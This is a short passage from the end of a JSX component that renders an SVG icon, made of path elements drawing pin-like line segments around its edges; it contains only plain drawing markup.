    <path d="M9 20v3" />
    <path d="M15 20v3" />
    <path d="M20 9h3" />
    <path d="M20 15h3" />
    <path d="M1 9h3" />
    <path d="M1 15h3" />
  </svg>
);
